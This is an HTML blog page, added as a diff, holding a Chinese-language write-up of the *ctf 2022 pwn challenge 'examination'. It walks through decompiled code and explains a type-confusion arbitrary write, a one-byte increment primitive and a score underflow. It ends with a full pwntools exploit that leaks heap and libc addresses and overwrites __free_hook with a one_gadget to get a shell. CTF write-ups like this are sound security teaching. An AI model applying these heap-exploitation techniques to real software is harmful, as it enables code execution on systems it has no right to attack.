@@ -1,0 +1,204 @@
+
+<!DOCTYPE html>
+<html lang="en" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>examination - Dreamcat</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Fechin,"> 
+    <meta name="description" content="from 2022.4.18 *ctf pwn examination保护：1234567dreamcat@ubuntu:~/Desktop/*ctf/examin$ checksec --file,"> 
+    <meta name="author" content="dreamcat"> 
+    <link rel="alternative" href="atom.xml" title="Dreamcat" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+    
+    
+    <meta name="twitter:card" content="summary"/>
+    <meta name="twitter:title" content="examination - Dreamcat"/>
+    <meta name="twitter:description" content="from 2022.4.18 *ctf pwn examination保护：1234567dreamcat@ubuntu:~/Desktop/*ctf/examin$ checksec --file,"/>
+    
+    
+    
+    
+    <meta property="og:site_name" content="Dreamcat"/>
+    <meta property="og:type" content="object"/>
+    <meta property="og:title" content="examination - Dreamcat"/>
+    <meta property="og:description" content="from 2022.4.18 *ctf pwn examination保护：1234567dreamcat@ubuntu:~/Desktop/*ctf/examin$ checksec --file,"/>
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">Dreamcat</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://example.com"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">examination</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">examination</h1>
+        <div class="stuff">
+            <span>四月 18, 2022</span>
+            
+  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/writeup/" rel="tag">writeup</a></li></ul>
+
+
+        </div>
+        <div class="content markdown">
+            <h1 id="from-2022-4-18-ctf-pwn-examination"><a href="#from-2022-4-18-ctf-pwn-examination" class="headerlink" title="from 2022.4.18 *ctf pwn examination"></a>from 2022.4.18 *ctf pwn examination</h1><h2 id="保护："><a href="#保护：" class="headerlink" title="保护："></a>保护：</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">dreamcat@ubuntu:~/Desktop<span class="comment">/*ctf/examin$ checksec --file=examination</span></span><br><span class="line"><span class="comment">RELRO           STACK CANARY      NX            PIE             </span></span><br><span class="line"><span class="comment">Full RELRO      Canary found      NX enabled    PIE enabled    </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE</span></span><br><span class="line"><span class="comment">No RPATH   RW-RUNPATH   No Symbols	  No	0		2		examination</span></span><br><span class="line"><span class="comment"></span></span><br></pre></td></tr></table></figure>
+
+<h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>程序，进行了不同的模式，teacher 或者student，</p>
+<h3 id="重要的结构体"><a href="#重要的结构体" class="headerlink" title="重要的结构体"></a>重要的结构体</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> student         struc ; (<span class="keyword">sizeof</span>=<span class="number">0x20</span>, mappedto_8)					/chunksize=<span class="number">0x31</span></span><br><span class="line"><span class="number">00000000</span> stu             dq ?                    ; offset</span><br><span class="line"><span class="number">00000008</span> nop             dq ?</span><br><span class="line"><span class="number">00000010</span> mode            dq ?                    ; offset					/mode chunkszie =<span class="number">0x31</span></span><br><span class="line"><span class="number">00000018</span> Type            dd ?</span><br><span class="line"><span class="number">0000001</span>C win             dd ?</span><br><span class="line"><span class="number">00000020</span> student         ends</span><br><span class="line"><span class="number">00000020</span></span><br><span class="line"><span class="number">00000000</span> ; ---------------------------------------------------------------------------</span><br><span class="line"><span class="number">00000000</span></span><br><span class="line"><span class="number">00000000</span> info            struc ; (<span class="keyword">sizeof</span>=<span class="number">0x14</span>, mappedto_9)					/chunksize=<span class="number">0x31</span></span><br><span class="line"><span class="number">00000000</span> nums_qestion    dd ?</span><br><span class="line"><span class="number">00000004</span> score           dd ?</span><br><span class="line"><span class="number">00000008</span> comment         dq ?                    ; offset</span><br><span class="line"><span class="number">00000010</span> size            dd ?</span><br><span class="line"><span class="number">00000014</span> info            ends</span><br><span class="line"><span class="number">00000014</span></span><br></pre></td></tr></table></figure>
+
+<p>按照惯例，我们首先要看的就是对于堆块的输入是否存在着溢出，</p>
+<p>在teacher模式下，可以写commend，但是因为要求你写入size，并根据size大小calloc，这里目前是不存在溢出的</p>
+<p>另外一个是在student模式下set mode，这里calloc 0x20大小的chunk，然后读入0X20数据，也不存在溢出。</p>
+<p>但是我们审计这里发现，判断程序是进行读入mode还是预测pray score，是根据student结构体中的type判断，而type又可以利用pray进行操作，type^&#x3D;1。同时pray sore 保存的地址与mode保存地址一致。所以这里存在任意地址写。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">set_mode</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  student *v1; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+14h] [rbp-1Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( nlist[a1]-&gt;Type != <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !nlist[a1]-&gt;mode )</span><br><span class="line">    &#123;</span><br><span class="line">      v1 = nlist[a1];</span><br><span class="line">      v1-&gt;mode = <span class="built_in">calloc</span>(<span class="number">1uLL</span>, <span class="number">0x20</span>uLL);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;enter your mode!&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, nlist[a1]-&gt;mode, <span class="number">0x20</span>uLL);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_9;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;enter your pray score: 0 to 100&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v3);</span><br><span class="line">  <span class="keyword">if</span> ( v3 &gt;= <span class="number">0</span> &amp;&amp; v3 &lt;= <span class="number">100</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    LOBYTE(nlist[a1]-&gt;mode) = v3;</span><br><span class="line">LABEL_9:</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;finish&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;bad!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> __fastcall <span class="title function_">pray</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;prayer...Good luck to you&quot;</span>);</span><br><span class="line">  nlist[a1]-&gt;Type ^= <span class="number">1u</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;finish&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>当我们继续继续审计代码，发现student的check rewiew 存在任意地址加一。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">checkfor_rewiew</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE *v1; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> address[<span class="number">24</span>]; <span class="comment">// [rsp+20h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( nlist[a1]-&gt;win == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;already gained the reward!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( nlist[a1]-&gt;stu-&gt;score &gt; <span class="number">0x59</span>u )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Good Job! Here is your reward! %p\n&quot;</span>, nlist[a1]);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;add 1 to wherever you want! addr: &quot;</span>);<span class="comment">// 任意地址加1</span></span><br><span class="line">      read_addr(<span class="number">0</span>, address, <span class="number">16</span>);</span><br><span class="line">      v1 = (_BYTE *)atol(address);</span><br><span class="line">      ++*v1;</span><br><span class="line">      nlist[a1]-&gt;win = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( nlist[a1]-&gt;stu-&gt;comment )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;here is the review:&quot;</span>);</span><br><span class="line">      write(<span class="number">1</span>, nlist[a1]-&gt;stu-&gt;comment, nlist[a1]-&gt;stu-&gt;size);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;no reviewing yet!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>看到这里时，我有想到将student comment的size进行加一，或者将student win加（但是没啥用好像）。</p>
+<p>再来，我们还需要关注free，程序只给了我们三次机会，而且只是将list中保留的student结构体指针清空，而没有清空其他的数据。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;which student id to choose?&quot;</span>);</span><br><span class="line">      read(<span class="number">0</span>, buf, <span class="number">5uLL</span>);</span><br><span class="line">      idx = atoi(buf);</span><br><span class="line">      <span class="keyword">if</span> ( idx &gt;= <span class="number">0</span> &amp;&amp; idx &lt;= <span class="number">9</span> &amp;&amp; nlist[idx] )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;bad luck for student %d! Say goodbye to him/her!&quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>)idx);</span><br><span class="line">        <span class="keyword">if</span> ( nlist[idx]-&gt;stu-&gt;message )</span><br><span class="line">          <span class="built_in">free</span>(nlist[idx]-&gt;stu-&gt;message);</span><br><span class="line">        <span class="built_in">free</span>(nlist[idx]-&gt;stu);</span><br><span class="line">        <span class="built_in">free</span>(nlist[idx]);</span><br><span class="line">        nlist[idx] = <span class="number">0LL</span>;</span><br><span class="line">        --count;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>
+
+<p>接下来思考程序对于堆块数据的输出。只有在student 模式的check review 可以输出comment。</p>
+<h2 id="着手漏洞"><a href="#着手漏洞" class="headerlink" title="着手漏洞"></a>着手漏洞</h2><h3 id="泄露地址"><a href="#泄露地址" class="headerlink" title="泄露地址"></a>泄露地址</h3><p>check review 有机会直接输出student的地址，但是分数需要够96,但是正常情况下是不可以的，因为question只能是0~6，但是我们发现，如果学生进行过pre，再次打分，就会被扣10分，而且数据比较的时候是无符号数，所以只要question数为1，在pray，被扣10分就会成为一个大数。输出chunk的地址。这里也解决了一个问题就是，因为我们释放次数有限，而且堆块大小也不可以超过0x3ff，free后chunk全部进入tcache，没法泄露libc，所以我们利用任意地址（一字节的数据类型）加1，可以将一个chunk变得很大，free后就可以进入unsortedbin，后面可以申请出来，即使tcache,存在，也会优先使用unsortedbin.所以我们只要后面write review的时候，size&lt;&#x3D;8,就可以保留bk指针不被修改。但是这里我们可以用更简单的方式，直接将size变得更大，（两个方法都要修改保存的comment size），直接越界输出main_arena。</p>
+<p>后面就是一个常规的想法，因为chunk上有comment的指针，所以我们利用上面的溢出，将指针改写为free_hook，然后再编辑该review，把onegadget写入。最后free实际就是调用execve().</p>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>  *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">r= process(<span class="string">&#x27;./examination&#x27;</span>)</span><br><span class="line">elf =ELF(<span class="string">&#x27;examination&#x27;</span>)</span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ch</span>(<span class="params">i</span>):</span><br><span class="line">        r.sendlineafter(<span class="string">&quot;choice&gt;&gt;&quot;</span>,<span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">changerole</span>(<span class="params">i</span>):</span><br><span class="line">        ch(<span class="number">5</span>)</span><br><span class="line">        r.sendlineafter(<span class="string">&quot;role:&quot;</span>,<span class="built_in">str</span>(i))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">givescore</span>():</span><br><span class="line">        ch(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">addstudent</span>(<span class="params">i</span>):</span><br><span class="line">        ch(<span class="number">1</span>)</span><br><span class="line">        r.sendlineafter(<span class="string">&quot;questions:&quot;</span>,<span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">writereview</span>(<span class="params">idx,size,text</span>):</span><br><span class="line">        ch(<span class="number">3</span>)</span><br><span class="line">        r.sendlineafter(<span class="string">&quot;one&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">        <span class="keyword">if</span> size:</span><br><span class="line">                r.sendlineafter(<span class="string">&quot;comment&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(text)==size:</span><br><span class="line">               r.sendafter(<span class="string">&quot;comment&quot;</span>,text)</span><br><span class="line">        <span class="keyword">else</span> :</span><br><span class="line">                 r.sendlineafter(<span class="string">&quot;comment&quot;</span>,text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">callparent</span>(<span class="params">idx</span>):</span><br><span class="line">        ch(<span class="number">4</span>)</span><br><span class="line">        r.sendlineafter(<span class="string">&quot;choose&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pray</span>():</span><br><span class="line">        ch(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">setmode</span>(<span class="params">text</span>):</span><br><span class="line">        ch(<span class="number">4</span>)</span><br><span class="line">        r.sendafter(<span class="string">&quot;mode&quot;</span>,text+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pray_score</span>(<span class="params">num</span>):</span><br><span class="line">        ch(<span class="number">4</span>)</span><br><span class="line">        r.sendlineafter(<span class="string">&quot;score&quot;</span>,<span class="built_in">str</span>(num))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">changeid</span>(<span class="params">i</span>):</span><br><span class="line">        ch(<span class="number">6</span>)</span><br><span class="line">        r.sendlineafter(<span class="string">&quot;id&quot;</span>,<span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line"><span class="comment">#leak heap_addr</span></span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">&quot;0&quot;</span>)</span><br><span class="line">addstudent(<span class="number">1</span>)</span><br><span class="line">givescore()</span><br><span class="line">writereview(<span class="number">0</span>,<span class="number">0x310</span>,<span class="string">&quot;aaaaaaa&quot;</span>)</span><br><span class="line">changerole(<span class="number">1</span>)</span><br><span class="line">pray()</span><br><span class="line">changerole(<span class="number">0</span>)</span><br><span class="line">addstudent(<span class="number">1</span>)</span><br><span class="line">pad = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0xa0</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x271</span>)+<span class="string">b&#x27;AAAAAAAA&#x27;</span></span><br><span class="line"></span><br><span class="line">writereview(<span class="number">1</span>,<span class="number">0x310</span>,<span class="string">&quot;aaaaaaaa&quot;</span>)</span><br><span class="line"></span><br><span class="line">addstudent(<span class="number">1</span>)</span><br><span class="line">writereview(<span class="number">2</span>,<span class="number">0x310</span>,pad)</span><br><span class="line">addstudent(<span class="number">1</span>)</span><br><span class="line">writereview(<span class="number">3</span>,<span class="number">0x20</span>,<span class="string">&quot;bbbbbbbb&quot;</span>)</span><br><span class="line">changerole(<span class="number">1</span>)</span><br><span class="line">changeid(<span class="number">1</span>)</span><br><span class="line">pray()</span><br><span class="line">changeid(<span class="number">2</span>)</span><br><span class="line">pray()</span><br><span class="line">changeid(<span class="number">3</span>)</span><br><span class="line">pray()</span><br><span class="line">changerole(<span class="number">0</span>)</span><br><span class="line">givescore()</span><br><span class="line">changerole(<span class="number">1</span>)</span><br><span class="line">ch(<span class="number">2</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;Good Job! Here is your reward! &quot;</span>)</span><br><span class="line">heap_addr = <span class="built_in">int</span>(r.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>),<span class="number">16</span>)-<span class="number">0x10</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;heap_addr : &quot;</span>,<span class="built_in">hex</span>(heap_addr))</span><br><span class="line">aimed = (heap_addr+<span class="number">0x3c9</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;aimed : &quot;</span>,<span class="built_in">hex</span>(aimed))</span><br><span class="line">r.sendafter(<span class="string">&quot;addr&quot;</span>,<span class="string">&quot;00&quot;</span>+<span class="built_in">str</span>(aimed))</span><br><span class="line"></span><br><span class="line"><span class="comment">#new student ,free to tcaceh </span></span><br><span class="line">r.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">changerole(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">callparent(<span class="number">1</span>)</span><br><span class="line">addstudent(<span class="number">1</span>)</span><br><span class="line">writereview(<span class="number">3</span>,<span class="number">0x18</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>)</span><br><span class="line">changerole(<span class="number">1</span>)</span><br><span class="line">changeid(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line">ch(<span class="number">2</span>)</span><br><span class="line">aimed = heap_addr+<span class="number">0x411</span></span><br><span class="line">r.sendafter(<span class="string">&quot;addr&quot;</span>,<span class="string">&quot;00&quot;</span>+<span class="built_in">str</span>(aimed))</span><br><span class="line">changeid(<span class="number">3</span>)</span><br><span class="line">ch(<span class="number">2</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">6</span>)</span><br><span class="line">libcbase = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x1ecbe0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc : &quot;</span>,<span class="built_in">hex</span>(libcbase))</span><br><span class="line">environ =libcbase- <span class="number">0x1ef600</span></span><br><span class="line">malloc_hook = libcbase + <span class="number">0x1ecb70</span></span><br><span class="line">free_hook = libcbase +  <span class="number">0x1eee48</span></span><br><span class="line">onegadget = libcbase + <span class="number">0xe3b31</span></span><br><span class="line"><span class="comment">#onegadget = 0xcafebabedeadbeef</span></span><br><span class="line">changerole(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#we have already leak the libc address,</span></span><br><span class="line"><span class="comment">#but next how can we realize write anywhere</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">addstudent(<span class="number">1</span>)</span><br><span class="line">writereview(<span class="number">4</span>,<span class="number">0x10</span>,<span class="string">&quot;CCCC&quot;</span>)</span><br><span class="line">pad =  <span class="string">b&#x27;x&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0x31</span>)</span><br><span class="line">pad += p64(heap_addr+<span class="number">0x470</span>)+p64(<span class="number">0</span>)*<span class="number">4</span></span><br><span class="line">pad += p64(<span class="number">0x21</span>)+p64(<span class="number">1</span>)+p64(free_hook)</span><br><span class="line">writereview(<span class="number">3</span>,<span class="number">0</span>,pad)</span><br><span class="line">writereview(<span class="number">4</span>,<span class="number">0</span>,p64(onegadget))</span><br><span class="line">callparent(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title="0" data-url="http://link.hhtjim.com/163/425570952.mp3"></li>
+                        
+                    
+                        
+                            <li title="1" data-url="http://link.hhtjim.com/163/425570952.mp3"></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id="gitalk-container" class="comment link"
+		data-enable="false"
+        data-ae="false"
+        data-ci=""
+        data-cs=""
+        data-r=""
+        data-o=""
+        data-a=""
+        data-d="false"
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class="side">
+			<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#from-2022-4-18-ctf-pwn-examination"><span class="toc-number">1.</span> <span class="toc-text">from 2022.4.18 *ctf pwn examination</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%9D%E6%8A%A4%EF%BC%9A"><span class="toc-number">1.1.</span> <span class="toc-text">保护：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E7%A8%8B"><span class="toc-number">1.2.</span> <span class="toc-text">过程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%87%8D%E8%A6%81%E7%9A%84%E7%BB%93%E6%9E%84%E4%BD%93"><span class="toc-number">1.2.1.</span> <span class="toc-text">重要的结构体</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9D%80%E6%89%8B%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.3.</span> <span class="toc-text">着手漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2%E5%9C%B0%E5%9D%80"><span class="toc-number">1.3.1.</span> <span class="toc-text">泄露地址</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp"><span class="toc-number">1.4.</span> <span class="toc-text">exp</span></a></li></ol></li></ol>	
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+</body>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
